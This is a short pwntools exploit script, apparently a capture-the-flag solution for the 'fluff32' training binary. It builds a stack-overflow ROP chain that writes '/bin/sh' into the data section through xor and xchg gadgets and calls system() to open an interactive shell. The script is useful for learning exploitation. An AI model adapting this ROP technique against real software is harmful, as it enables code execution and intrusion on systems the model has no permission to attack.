from pwn import *

context.log_level = 'debug'

sh = process("./fluff32")
elf = ELF("./fluff32")
system = elf.plt['system']
data_addr = 0x0804a028

mov_ecx_edx = 0x08048693 # mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
xchg_edx_ecx = 0x08048689 # xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret   
xor_edx_ebx = 0x0804867b # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_edx = 0x08048671 # xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
pop_ebx = 0x080483e1 # pop ebx ; ret

mov_edx_ebx = p32(xor_edx_edx) + b'b' * 4 +  p32(xor_edx_ebx) + b'b' * 4 

binls = 0x08048793
binsh = "/bin/sh\x00"
payload = b'a' *  0x2c
# payload += p32(system) + b'b' * 4 + p32(binls)
payload += p32(pop_ebx) + p32(data_addr) + mov_edx_ebx +  p32(xchg_edx_ecx) + b'b' * 4 # ecx = data addr
payload += p32(pop_ebx) + binsh[0:4].encode('utf-8') + mov_edx_ebx + p32(mov_ecx_edx) + b'b' * 4 + p32(0)
payload += p32(pop_ebx) + p32(data_addr+4) + mov_edx_ebx +  p32(xchg_edx_ecx) + b'b' * 4 # ecx = data addr
payload += p32(pop_ebx) + binsh[4:8].encode('utf-8') + mov_edx_ebx + p32(mov_ecx_edx) + b'b' * 4 + p32(0)
payload += p32(system) + b'b' * 4 + p32(data_addr)
sh.recv()
sh.sendline(payload)
sh.interactive()